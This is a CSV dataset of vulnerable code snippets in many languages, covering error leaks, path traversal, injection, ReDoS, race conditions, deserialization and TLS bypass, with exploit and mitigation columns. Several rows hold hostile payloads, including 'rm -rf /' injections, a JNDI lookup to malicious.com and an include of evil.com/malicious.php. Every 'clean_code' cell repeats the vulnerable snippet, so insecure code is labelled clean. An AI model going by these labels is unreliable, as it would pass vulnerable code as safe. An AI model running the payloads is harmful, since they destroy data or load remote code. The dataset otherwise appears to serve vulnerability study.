id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-265,PHP,Improper Error Handling,Displaying PHP errors to users.,"ini_set('display_errors', 1); throw new Exception('Test');",Extract info from error output.,"ini_set('display_errors', 0); set_error_handler(function() { http_response_code(500); echo 'Error'; });","ini_set('display_errors', 1); throw new Exception('Test');",False,False,False,False,58,False,True,False,Other,1
vuln-266,Ruby,Improper Error Handling,Leaking stack traces.,get '/' do raise 'Test' end,Analyze stack traces for secrets.,"configure { set :show_exceptions, false }; error { 'Error' }",get '/' do raise 'Test' end,False,False,False,False,27,False,True,False,Other,1
vuln-267,Go,Improper Error Handling,Exposing error details.,"http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { panic(""Test"") })",Extract sensitive data from panic output.,"Use recover: defer func() { if r := recover(); r != nil { http.Error(w, ""Error"", 500) } }()","http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { panic(""Test"") })",False,False,False,False,84,False,True,False,Other,1
vuln-268,C# (.NET),Improper Error Handling,Leaking stack traces.,"[HttpGet(""/"")] public IActionResult Index() { throw new Exception(""Test""); }",Extract info from stack traces.,"app.UseExceptionHandler(err => err.Run(async ctx => await ctx.Response.WriteAsync(""Error"")));","[HttpGet(""/"")] public IActionResult Index() { throw new Exception(""Test""); }",False,False,False,False,76,False,True,False,Other,1
vuln-269,Kotlin,Improper Error Handling,Exposing stack traces in Ktor.,"get(""/"") { throw Exception(""Test"") }",Analyze stack traces for secrets.,"install(StatusPages) { exception<Exception> { call.respond(HttpStatusCode.InternalServerError, ""Error"") } }","get(""/"") { throw Exception(""Test"") }",False,False,False,False,36,False,True,False,Other,1
vuln-270,Scala,Improper Error Handling,Leaking stack traces.,"get(""/"") { throw new Exception(""Test"") }",Extract sensitive data from traces.,"Action { implicit request => try { ... } catch { case e: Exception => InternalServerError(""Error"") } }","get(""/"") { throw new Exception(""Test"") }",False,False,False,False,40,False,True,False,Other,1
vuln-271,Rust,Improper Error Handling,Exposing panic details.,"router.get(""/"", |_, _| panic!(""Test""));",Extract info from panic output.,Use catch_unwind: std::panic::catch_unwind(|| ...).unwrap_or_else(|_| Err(StatusCode::INTERNAL_SERVER_ERROR)),"router.get(""/"", |_, _| panic!(""Test""));",False,False,False,False,39,False,True,False,Other,1
vuln-272,Elixir,Improper Error Handling,Leaking error details.,"get ""/"", PageController, :index # raises error",Analyze error output for secrets.,"plug :error_handler; def error_handler(conn, _) do send_resp(conn, 500, ""Error"") end","get ""/"", PageController, :index # raises error",False,False,False,False,46,False,True,False,Other,1
vuln-273,Perl,Improper Error Handling,Exposing error messages.,"die ""Test error"";",Extract sensitive info from errors.,eval { ... }; if ($@) { $r->print('Error'); $r->status(500); },"die ""Test error"";",False,False,False,False,17,False,True,False,Other,1
vuln-274,Node.js,Insecure File Download,No validation on file downloads.,res.download(`files/${req.query.file}`);,Download ../../etc/passwd.,"Validate: path.resolve(baseDir, file); check prefix.",res.download(`files/${req.query.file}`);,True,True,False,False,40,False,False,True,File_Handling,1
vuln-275,Python,Insecure File Download,Serving files with user input.,return send_file(request.args.get('file')),Access ../../etc/passwd.,"Use os.path.join(base_dir, file); validate path.",return send_file(request.args.get('file')),False,False,False,False,42,False,True,False,File_Handling,1
vuln-276,Java,Insecure File Download,Serving unvalidated files.,"Files.copy(Paths.get(""files/"" + request.getParameter(""file"")), response.getOutputStream());",Download ../../etc/passwd.,"Use Paths.get(baseDir, file).normalize(); check prefix.","Files.copy(Paths.get(""files/"" + request.getParameter(""file"")), response.getOutputStream());",True,False,False,False,91,False,True,True,File_Handling,1
vuln-277,PHP,Insecure File Download,Serving files with user input.,readfile('files/' . $_GET['file']);,Access ../../etc/passwd.,Validate: realpath('files/' . $file) starts with base dir.,readfile('files/' . $_GET['file']);,False,False,True,False,35,False,True,False,File_Handling,1
vuln-278,Ruby,Insecure File Download,Unvalidated file serving.,"send_file ""files/#{params[:file]}""",Download ../../etc/passwd.,Use File.expand_path; check base dir.,"send_file ""files/#{params[:file]}""",True,False,False,False,34,False,True,False,File_Handling,1
vuln-279,Go,Insecure File Download,Serving files with user input.,"http.ServeFile(w, r, ""files/""+r.URL.Query().Get(""file""))",Access ../../etc/passwd.,"Use filepath.Join(baseDir, file); validate path.","http.ServeFile(w, r, ""files/""+r.URL.Query().Get(""file""))",True,True,False,False,56,False,True,True,File_Handling,1
vuln-280,C# (.NET),Insecure File Download,Serving unvalidated files.,"return PhysicalFile($""files/{Request.Query[""file""]}"", ""application/octet-stream"");",Download ../../web.config.,"Validate: Path.Combine(baseDir, file); check prefix.","return PhysicalFile($""files/{Request.Query[""file""]}"", ""application/octet-stream"");",True,True,False,False,82,False,True,False,File_Handling,1
vuln-281,Kotlin,Insecure File Download,Serving files with user input.,"call.respondFile(File(""files/${call.request.queryParameters[""file""]}""))",Access ../../etc/passwd.,"Use File(baseDir, file).canonicalPath; check prefix.","call.respondFile(File(""files/${call.request.queryParameters[""file""]}""))",True,True,False,False,71,False,True,True,File_Handling,1
vuln-282,Scala,Insecure File Download,Unvalidated file serving.,"Ok.sendFile(new File(s""files/${params(""file"")}""))",Download ../../etc/passwd.,"Validate: new File(baseDir, file).getCanonicalPath startsWith baseDir.","Ok.sendFile(new File(s""files/${params(""file"")}""))",True,False,False,False,49,False,True,True,File_Handling,1
vuln-283,Rust,Insecure File Download,Serving files with user input.,"fs::read_to_string(&req.query(""file"")?).map(|c| res.render_text(c))",Access ../../etc/passwd.,Use Path::new(base_dir).join(file).canonicalize(); check prefix.,"fs::read_to_string(&req.query(""file"")?).map(|c| res.render_text(c))",True,True,False,False,67,False,True,False,File_Handling,1
vuln-284,Elixir,Insecure File Download,Serving unvalidated files.,"send_download(conn, {:file, ""files/"" <> params[""file""]}",Download ../../etc/passwd.,"Validate: Path.expand(""files/"" <> file) starts with base dir.","send_download(conn, {:file, ""files/"" <> params[""file""]}",True,False,False,False,55,False,True,False,File_Handling,1
vuln-285,Perl,Insecure File Download,Serving files with user input.,"open(my $fh, '<', ""files/$filename""); $r->sendfile($fh);",Access ../../etc/passwd.,"Validate: realpath(""files/$filename"") =~ /^$base_dir/.","open(my $fh, '<', ""files/$filename""); $r->sendfile($fh);",False,False,True,False,56,False,True,False,File_Handling,1
vuln-286,Node.js,Unvalidated Input in GraphQL,No input validation in GraphQL resolvers.,"const resolvers = { Query: { user: (_, { id }) => db.findUser(id) } };",Inject malicious IDs or SQL.,Validate: if (!/^[0-9]+$/.test(id)) throw Error('Invalid ID');,"const resolvers = { Query: { user: (_, { id }) => db.findUser(id) } };",True,True,False,False,70,False,False,False,Other,1
vuln-287,Python,Unvalidated Input in GraphQL,No validation in Graphene resolvers.,"class Query(graphene.ObjectType): user = graphene.Field(User, id=graphene.String()); def resolve_user(self, info, id): return db.get_user(id)",Inject malicious input.,Validate: if not id.isdigit(): raise ValueError('Invalid ID'),"class Query(graphene.ObjectType): user = graphene.Field(User, id=graphene.String()); def resolve_user(self, info, id): return db.get_user(id)",True,True,False,False,141,False,False,False,Other,1
vuln-288,Java,Unvalidated Input in GraphQL,No input validation in GraphQL-Java.,"@GraphQLField public User user(@GraphQLArgument(name = ""id"") String id) { return db.findUser(id); }",Inject malicious IDs.,"Validate: if (!id.matches(""^[0-9]+$"")) throw new IllegalArgumentException();","@GraphQLField public User user(@GraphQLArgument(name = ""id"") String id) { return db.findUser(id); }",False,False,False,False,99,False,True,False,Other,1
vuln-289,PHP,Unvalidated Input in GraphQL,No validation in GraphQL-PHP resolvers.,"'user' => function ($root, $args) { return $db->findUser($args['id']); }",Inject malicious input.,Validate: if (!ctype_digit($args['id'])) throw new Exception('Invalid ID');,"'user' => function ($root, $args) { return $db->findUser($args['id']); }",False,False,False,False,72,False,True,False,Other,1
vuln-290,Ruby,Unvalidated Input in GraphQL,No validation in GraphQL-Ruby.,"field :user, Types::UserType, null: true do argument :id, ID end; def user(id:) User.find(id) end",Inject malicious IDs.,Validate: raise 'Invalid ID' unless id =~ /^[0-9]+$/;,"field :user, Types::UserType, null: true do argument :id, ID end; def user(id:) User.find(id) end",False,False,False,False,97,False,False,False,Other,1
vuln-291,Go,Unvalidated Input in GraphQL,No validation in gqlgen resolvers.,"func (r *Resolver) User(ctx context.Context, id string) (*model.User, error) { return db.FindUser(id), nil }",Inject malicious input.,"Validate: if !regexp.MustCompile(`^[0-9]+$`).MatchString(id) { return nil, errors.New(""Invalid ID"") }","func (r *Resolver) User(ctx context.Context, id string) (*model.User, error) { return db.FindUser(id), nil }",False,False,False,False,108,False,False,False,Other,1
vuln-292,C# (.NET),Unvalidated Input in GraphQL,No validation in HotChocolate resolvers.,public User GetUser(string id) => db.FindUser(id);,Inject malicious IDs.,"Validate: if (!Regex.IsMatch(id, ""^[0-9]+$"")) throw new ArgumentException();",public User GetUser(string id) => db.FindUser(id);,False,False,False,False,50,False,False,False,Other,1
vuln-293,Kotlin,Unvalidated Input in GraphQL,No validation in GraphQL-Kotlin.,fun user(id: String): User = db.findUser(id),Inject malicious input.,"Validate: if (!id.matches(Regex(""^[0-9]+$""))) throw IllegalArgumentException(""Invalid ID"")",fun user(id: String): User = db.findUser(id),False,False,False,False,44,False,False,False,Other,1
vuln-294,Scala,Unvalidated Input in GraphQL,No validation in Sangria resolvers.,"Field(""user"", OptionType(UserType), arguments = ID :: Nil, resolve = ctx => db.findUser(ctx.arg(ID)))",Inject malicious IDs.,"Validate: if (ctx.arg(ID).matches(""^[0-9]+$"")) db.findUser else throw new Exception","Field(""user"", OptionType(UserType), arguments = ID :: Nil, resolve = ctx => db.findUser(ctx.arg(ID)))",False,False,False,False,101,False,True,False,Other,1
vuln-295,Rust,Unvalidated Input in GraphQL,No validation in Juniper resolvers.,fn user(id: String) -> Option<User> { db.find_user(&id) },Inject malicious input.,Validate: if id.chars().all(|c| c.is_digit(10)) { db.find_user(&id) } else { None },fn user(id: String) -> Option<User> { db.find_user(&id) },False,False,False,False,57,False,False,False,Other,1
vuln-296,Elixir,Unvalidated Input in GraphQL,No validation in Absinthe resolvers.,"field :user, :user do arg :id, non_null(:string); resolve fn %{id: id}, _ -> {:ok, Repo.get(User, id)} end end",Inject malicious IDs.,"Validate: if String.match?(id, ~r/^[0-9]+$/) do Repo.get(User, id) else {:error, ""Invalid ID""} end","field :user, :user do arg :id, non_null(:string); resolve fn %{id: id}, _ -> {:ok, Repo.get(User, id)} end end",False,False,False,False,110,False,False,False,Other,1
vuln-297,Perl,Unvalidated Input in GraphQL,No validation in GraphQL resolvers.,sub user { my ($args) = @_; return $db->find_user($args->{id}); },Inject malicious input.,Validate: return undef unless $args->{id} =~ /^[0-9]+$/;,sub user { my ($args) = @_; return $db->find_user($args->{id}); },False,False,False,False,65,False,False,False,Other,1
vuln-298,Node.js,Insecure Logging,Logging sensitive data.,"console.log(`User login: ${user.email}, ${user.password}`);",Access logs to extract credentials.,Avoid logging sensitive data: console.log(`User login: ${user.id}`);,"console.log(`User login: ${user.email}, ${user.password}`);",False,False,False,False,59,False,False,True,Other,1
vuln-299,Python,Insecure Logging,Logging sensitive information.,"logging.info(f'User login: {user.email}, {user.password}')",Read logs for credentials.,Log safely: logging.info(f'User login: {user.id}'),"logging.info(f'User login: {user.email}, {user.password}')",False,False,False,False,58,False,True,False,Other,1
vuln-301,PHP,Insecure Logging,Logging sensitive data to unprotected logs.,"error_log('User login: ' . $user['email'] . ', ' . $user['password']);",Access log files to extract credentials or PII.,Avoid logging sensitive data: error_log('User login: ' . $user['id']); Use secure log storage.,"error_log('User login: ' . $user['email'] . ', ' . $user['password']);",False,False,False,False,70,False,True,False,Other,1
vuln-302,Ruby,Insecure Logging,Logging sensitive information in plain text.,"Rails.logger.info ""User login: #{user.email}, #{user.password}""",Read logs to obtain credentials or session tokens.,"Log only non-sensitive data: Rails.logger.info ""User login: #{user.id}""","Rails.logger.info ""User login: #{user.email}, #{user.password}""",False,False,False,False,63,False,True,False,Other,1
vuln-303,Go,Insecure Logging,Logging sensitive data to stdout or files.,"log.Printf(""User login: %s, %s"", user.Email, user.Password)",Access logs via exposed endpoints or file leaks.,"Log: log.Printf(""User login: %s"", user.ID); Use structured logging with redaction.","log.Printf(""User login: %s, %s"", user.Email, user.Password)",False,False,False,False,59,False,True,True,Other,1
vuln-304,C# (.NET),Insecure Logging,Logging sensitive data without redaction.,"logger.LogInformation(""User login: {Email}, {Password}"", user.Email, user.Password);",Extract credentials from log files or monitoring systems.,"Log: logger.LogInformation(""User login: {Id}"", user.Id); Use Serilog with redaction.","logger.LogInformation(""User login: {Email}, {Password}"", user.Email, user.Password);",False,False,False,False,84,False,True,False,Other,1
vuln-306,Scala,Insecure Logging,Logging sensitive data without sanitization.,"logger.info(s""User login: ${user.email}, ${user.password}"")",Extract PII or credentials from logs.,"Log: logger.info(s""User login: ${user.id}""); Use secure logging frameworks.","logger.info(s""User login: ${user.email}, ${user.password}"")",False,False,False,False,59,False,True,True,Other,1
vuln-307,Rust,Insecure Logging,Logging sensitive data to unsecured logs.,"log::info!(""User login: {}, {}"", user.email, user.password);",Access logs via misconfigured storage.,"Log: log::info!(""User login: {}"", user.id); Use log redaction.","log::info!(""User login: {}, {}"", user.email, user.password);",False,False,False,False,60,False,True,False,Other,1
vuln-308,Elixir,Insecure Logging,Logging sensitive data in plain text.,"Logger.info(""User login: #{user.email}, #{user.password}"")",Steal credentials from log files.,"Log: Logger.info(""User login: #{user.id}""); Secure log access.","Logger.info(""User login: #{user.email}, #{user.password}"")",False,False,False,False,58,False,True,False,Other,1
vuln-309,Perl,Insecure Logging,Logging sensitive data to files.,"print LOG ""User login: $user->{email}, $user->{password}\n"";",Access unprotected log files.,"Log: print LOG ""User login: $user->{id}\n""; Restrict log access.","print LOG ""User login: $user->{email}, $user->{password}\n"";",False,False,False,False,60,False,True,False,Other,1
vuln-310,Node.js,Prototype Pollution,Merging objects without sanitization.,"Object.assign({}, req.body);","Inject __proto__ to alter object behavior: {""__proto__"": {""admin"": true}}",Use Object.create(null) or libraries like lodash.cloneDeep.,"Object.assign({}, req.body);",True,False,False,False,28,False,False,False,Other,1
vuln-311,Python,Prototype Pollution Equivalent,Dynamic attribute assignment on objects.,"for key, value in user_input.items(): setattr(obj, key, value)",Inject __class__ or __init__ to manipulate object behavior.,"Whitelist allowed attributes: if key in allowed_attrs: setattr(obj, key, value)","for key, value in user_input.items(): setattr(obj, key, value)",True,False,False,False,62,False,False,False,Other,1
vuln-312,Java,Reflection Injection,Dynamic method invocation with user input.,Method method = Class.forName(className).getMethod(methodName); method.invoke(obj);,Invoke dangerous methods like Runtime.exec.,Whitelist allowed classes and methods.,Method method = Class.forName(className).getMethod(methodName); method.invoke(obj);,False,False,False,False,83,False,False,False,Injection,1
vuln-313,PHP,Dynamic Function Call,Calling functions based on user input.,$func = $_GET['action']; $func();,Call dangerous functions like eval or system.,"Whitelist: if (in_array($func, ['safe_func1', 'safe_func2'])) $func();",$func = $_GET['action']; $func();,False,False,False,False,33,False,True,False,Other,1
vuln-314,Ruby,Dynamic Method Invocation,Invoking methods based on user input.,obj.send(params[:method]),Call sensitive methods like instance_eval.,Whitelist: obj.send(method) if %w[safe_method1 safe_method2].include?(method),obj.send(params[:method]),True,False,False,False,25,False,False,False,Other,1
vuln-315,Go,Race Condition,Concurrent access to shared resources.,if counter > 0 { counter--; doWork() },Exploit TOCTOU to bypass checks.,Use sync.Mutex: mu.Lock(); defer mu.Unlock();,if counter > 0 { counter--; doWork() },False,False,False,False,38,False,False,False,Other,1
vuln-316,C# (.NET),Race Condition,Non-atomic operations on shared state.,if (counter > 0) { counter--; DoWork(); },Concurrent threads bypass counter check.,Use lock: lock (syncRoot) { if (counter > 0) counter--; },if (counter > 0) { counter--; DoWork(); },False,False,False,False,41,False,False,False,Other,1
vuln-317,Kotlin,Race Condition,Non-synchronized shared resource access.,if (counter > 0) { counter--; doWork() },Race condition to skip counter decrement.,Use synchronized: synchronized(lock) { if (counter > 0) counter-- },if (counter > 0) { counter--; doWork() },False,False,False,False,40,False,False,False,Other,1
vuln-318,Scala,Race Condition,Concurrent access to shared variable.,if (counter > 0) { counter -= 1; doWork() },Exploit race to bypass counter.,Use synchronized or Akka actors for concurrency.,if (counter > 0) { counter -= 1; doWork() },False,False,False,False,43,False,False,False,Other,1
vuln-319,Rust,Race Condition,Unsynchronized shared state access.,if *counter > 0 { *counter -= 1; do_work(); },Concurrent access bypasses counter.,Use Mutex: let mut counter = counter.lock().unwrap();,if *counter > 0 { *counter -= 1; do_work(); },False,False,False,False,45,False,False,False,Other,1
vuln-320,Elixir,Message Passing Race,Uncoordinated message passing in GenServer.,"def handle_call(:increment, _from, state), do: {:reply, :ok, state + 1}",Concurrent calls cause inconsistent state.,Use GenServer state management to enforce atomicity.,"def handle_call(:increment, _from, state), do: {:reply, :ok, state + 1}",False,False,False,False,71,False,False,True,Other,1
vuln-321,Perl,Race Condition,File access race condition.,"if (-e $file) { open(my $fh, '>', $file); }",TOCTOU attack to overwrite files.,Use flock for file locking.,"if (-e $file) { open(my $fh, '>', $file); }",False,False,True,False,43,False,True,False,Other,1
vuln-322,Node.js,Server-Side Template Injection,Dynamic template rendering with user input.,const template = Handlebars.compile(userInput); res.send(template(data));,Inject {{process.mainModule.require('child_process').execSync('rm -rf /')}},Avoid user input in templates; use precompiled templates.,const template = Handlebars.compile(userInput); res.send(template(data));,True,False,False,False,73,False,False,False,Injection,1
vuln-323,Python,Code Injection via Dynamic Execution,Executing user input as code.,exec(user_input),Inject: __import__('os').system('rm -rf /'),Never use exec; use safe alternatives like ast.literal_eval.,exec(user_input),True,True,False,True,16,False,False,False,Injection,1
vuln-324,Java,Script Engine Injection,Running user input in script engine.,"ScriptEngine engine = new ScriptEngineManager().getEngineByName(""js""); engine.eval(userInput);",Inject JavaScript to call Java methods.,Avoid user input in script engines; use static scripts.,"ScriptEngine engine = new ScriptEngineManager().getEngineByName(""js""); engine.eval(userInput);",True,False,False,True,94,False,True,False,Injection,1
vuln-325,PHP,Dynamic Include,Including files based on user input.,include $_GET['page'] . '.php';,Include malicious file: ?page=../../etc/passwd,"Whitelist: if (in_array($page, ['home', 'about'])) include $page . '.php';",include $_GET['page'] . '.php';,False,False,False,False,31,False,True,False,Other,1
vuln-326,Ruby,Dynamic Constant Assignment,Assigning constants dynamically with user input.,"Object.const_set(params[:name], Class.new)",Inject malicious class names to alter behavior.,Avoid dynamic constants; use predefined names.,"Object.const_set(params[:name], Class.new)",True,False,False,False,42,False,False,False,Other,1
vuln-327,Go,SQL Injection via Dynamic Queries,Dynamic SQL query construction.,"db.Query(fmt.Sprintf(""SELECT * FROM users WHERE name = '%s'"", userInput))",Inject: ' OR 1=1--,"Use prepared statements: db.Query(""SELECT * FROM users WHERE name = ?"", userInput)","db.Query(fmt.Sprintf(""SELECT * FROM users WHERE name = '%s'"", userInput))",True,True,False,False,73,False,True,True,Injection,1
vuln-328,C# (.NET),Dynamic Code Execution,Executing dynamic C# code.,"CSharpCodeProvider provider = new CSharpCodeProvider(); provider.CompileAssemblyFromSource(params, userInput).CreateInstance().Execute();",Inject malicious C# code.,Avoid dynamic code execution; use static assemblies.,"CSharpCodeProvider provider = new CSharpCodeProvider(); provider.CompileAssemblyFromSource(params, userInput).CreateInstance().Execute();",True,True,False,True,137,False,False,False,Other,1
vuln-329,Kotlin,Script Engine Injection,Running user input in Kotlin script engine.,val engine = KotlinJsr223JvmLocalScriptEngineFactory().scriptEngine; engine.eval(userInput),Inject malicious Kotlin code.,Use static scripts; avoid user input.,val engine = KotlinJsr223JvmLocalScriptEngineFactory().scriptEngine; engine.eval(userInput),True,False,False,True,91,False,False,False,Injection,1
vuln-330,Scala,Dynamic Code Evaluation,Evaluating user input as Scala code.,scala.tools.nsc.interpreter.IMain().interpret(userInput),Inject malicious Scala code.,Avoid dynamic evaluation; use predefined logic.,scala.tools.nsc.interpreter.IMain().interpret(userInput),True,False,False,False,56,False,False,False,Other,1
vuln-331,Rust,Unsafe Memory Access,Using unsafe block with unvalidated input.,unsafe { let ptr = input as *mut i32; *ptr = 42; },Manipulate pointer to cause memory corruption.,Avoid unsafe; use safe Rust abstractions.,unsafe { let ptr = input as *mut i32; *ptr = 42; },True,False,False,False,50,False,False,False,Other,1
vuln-332,Elixir,Dynamic Code Execution,Evaluating user input as Elixir code.,Code.eval_string(user_input),"Inject: System.cmd(""rm"", [""-rf"", ""/""])",Never evaluate user input; use static functions.,Code.eval_string(user_input),True,False,False,True,28,False,False,False,Other,1
vuln-333,Perl,Dynamic Code Execution,Evaluating user input as Perl code.,eval $user_input;,Inject: system('rm -rf /');,Avoid eval; use predefined subroutines.,eval $user_input;,True,False,False,True,17,False,False,False,Other,1
vuln-334,Node.js,Regex Injection,Using user input in regex patterns.,const regex = new RegExp(req.query.pattern); string.match(regex);,Inject complex regex for ReDoS.,Sanitize: if (!pattern.match(/^[a-zA-Z0-9]+$/)) throw Error('Invalid pattern');,const regex = new RegExp(req.query.pattern); string.match(regex);,True,True,False,False,65,False,False,False,Injection,1
vuln-335,Python,Regex Injection,Dynamic regex from user input.,regex = re.compile(request.args.get('pattern')); regex.match(string),Inject: (a+)+ for ReDoS attack.,"Validate: if re.match(r'^[a-zA-Z0-9]+$', pattern): re.compile(pattern)",regex = re.compile(request.args.get('pattern')); regex.match(string),False,False,False,False,68,False,True,False,Injection,1
vuln-336,Java,Regex Injection,Dynamic regex compilation.,"Pattern pattern = Pattern.compile(request.getParameter(""pattern"")); pattern.matcher(string);",Inject complex regex for DoS.,"Validate: if (pattern.matches(""^[a-zA-Z0-9]+$"")) Pattern.compile(pattern);","Pattern pattern = Pattern.compile(request.getParameter(""pattern"")); pattern.matcher(string);",True,False,False,False,92,False,True,False,Injection,1
vuln-337,PHP,Regex Injection,User input in preg_match pattern.,"preg_match('/' . $_GET['pattern'] . '/', $string);",Inject: (a+)+ for ReDoS.,"Validate: if (preg_match('/^[a-zA-Z0-9]+$/', $pattern)) preg_match('/' . $pattern . '/');","preg_match('/' . $_GET['pattern'] . '/', $string);",False,False,False,False,50,False,True,False,Injection,1
vuln-338,Ruby,Regex Injection,Dynamic regex from user input.,regex = Regexp.new(params[:pattern]); string =~ regex,Inject: (a+)+ for ReDoS.,Validate: regex = Regexp.new(pattern) if pattern =~ /^[a-zA-Z0-9]+$/;,regex = Regexp.new(params[:pattern]); string =~ regex,True,False,False,False,53,False,False,False,Injection,1
vuln-339,Go,Regex Injection,Dynamic regex compilation.,"regex, _ := regexp.Compile(r.URL.Query().Get(""pattern"")); regex.MatchString(string)",Inject complex regex for DoS.,"Validate: if regexp.MatchString(`^[a-zA-Z0-9]+$`, pattern) { regexp.Compile(pattern) }","regex, _ := regexp.Compile(r.URL.Query().Get(""pattern"")); regex.MatchString(string)",True,True,False,False,83,False,True,False,Injection,1
vuln-340,C# (.NET),Regex Injection,Dynamic regex from user input.,"Regex regex = new Regex(Request.Query[""pattern""]); regex.IsMatch(input);",Inject: (a+)+ for ReDoS.,"Validate: if (Regex.IsMatch(pattern, ""^[a-zA-Z0-9]+$"")) new Regex(pattern);","Regex regex = new Regex(Request.Query[""pattern""]); regex.IsMatch(input);",True,True,False,False,72,False,True,False,Injection,1
vuln-341,Kotlin,Regex Injection,Dynamic regex compilation.,"val regex = request.queryParameters[""pattern""]!!.toRegex(); regex.matches(input)",Inject complex regex for DoS.,"Validate: if (pattern.matches(Regex(""^[a-zA-Z0-9]+$""))) pattern.toRegex()","val regex = request.queryParameters[""pattern""]!!.toRegex(); regex.matches(input)",True,True,False,False,80,False,True,False,Injection,1
vuln-342,Scala,Regex Injection,Dynamic regex from user input.,"val regex = params(""pattern"").r; regex.findFirstIn(input)",Inject: (a+)+ for ReDoS.,"Validate: if (pattern.matches(""^[a-zA-Z0-9]+$"")) pattern.r","val regex = params(""pattern"").r; regex.findFirstIn(input)",True,False,False,False,57,False,True,False,Injection,1
vuln-343,Rust,Regex Injection,Dynamic regex compilation.,"let regex = Regex::new(&req.query(""pattern"")?).unwrap(); regex.is_match(&input)",Inject complex regex for DoS.,Validate: if pattern.chars().all(|c| c.is_alphanumeric()) { Regex::new(&pattern) },"let regex = Regex::new(&req.query(""pattern"")?).unwrap(); regex.is_match(&input)",True,True,False,False,79,False,True,False,Injection,1
vuln-344,Elixir,Regex Injection,Dynamic regex from user input.,"regex = Regex.compile!(params[:pattern]); Regex.match?(regex, input)",Inject: (a+)+ for ReDoS.,"Validate: if String.match?(pattern, ~r/^[a-zA-Z0-9]+$/) do Regex.compile!(pattern) end","regex = Regex.compile!(params[:pattern]); Regex.match?(regex, input)",True,False,False,False,68,False,False,False,Injection,1
vuln-345,Perl,Regex Injection,Dynamic regex from user input.,if ($input =~ /$pattern/) { ... },Inject: (a+)+ for ReDoS.,Validate: if ($pattern =~ /^[a-zA-Z0-9]+$/) { ... },if ($input =~ /$pattern/) { ... },True,False,False,False,33,False,False,False,Injection,1
vuln-346,Node.js,Prototype Pollution in Dependencies,Vulnerable library allowing prototype pollution.,"const merge = require('lodash.merge'); merge({}, JSON.parse(userInput));",Inject __proto__ to alter object behavior.,Update to patched lodash version; avoid deep merges with user input.,"const merge = require(); merge({}, JSON.parse(userInput));",True,False,False,False,72,False,True,False,Other,1
vuln-347,Python,Insecure Pickle Usage,Deserialization of untrusted pickle data.,import pickle; obj = pickle.loads(request.data),Craft malicious pickle payload for RCE.,Use JSON or YAML.safe_load; avoid pickle for user input.,import pickle; obj = pickle.loads(request.data),False,False,False,False,47,False,False,False,Other,1
vuln-348,Java,JNDI Injection,Untrusted input in JNDI lookups.,InitialContext ctx = new InitialContext(); ctx.lookup(userInput);,Inject: ldap://malicious.com/a for RCE.,Validate input; disable JNDI remote lookups.,InitialContext ctx = new InitialContext(); ctx.lookup(userInput);,True,False,False,False,65,False,False,False,Injection,1
vuln-349,PHP,Remote File Inclusion,Including remote files based on user input.,include($_GET['file']);,Inject: http://evil.com/malicious.php,Disable allow_url_include; whitelist local files.,include($_GET['file']);,False,False,False,False,23,False,True,False,File_Handling,1
vuln-350,Ruby,Mass Assignment Vulnerability,Unrestricted model attribute updates.,User.update(params[:user]),Inject admin: true in params.,"Use strong parameters: params.require(:user).permit(:name, :email)",User.update(params[:user]),True,True,False,False,26,False,False,False,Other,1
vuln-351,Go,Insecure HTTP Client,HTTP client without TLS verification.,client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}};,MITM attacks to intercept traffic.,Set InsecureSkipVerify: false; validate certificates.,client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}};,False,False,False,False,107,False,False,False,Other,1
vuln-352,C# (.NET),Insecure TLS Configuration,Ignoring TLS certificate validation.,"ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;",MITM attack to spoof server.,Use default validation or custom strict validation.,"ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;",False,False,False,True,96,False,False,False,Configuration,1
vuln-353,Kotlin,Insecure TLS Configuration,Bypassing TLS certificate checks.,"val client = OkHttpClient.Builder().sslSocketFactory(trustAllCerts(), TrustAllCerts()).build()",MITM to intercept requests.,Use default SSL configuration with proper validation.,"val client = OkHttpClient.Builder().sslSocketFactory(trustAllCerts(), TrustAllCerts()).build()",False,False,False,False,94,False,False,False,Configuration,1
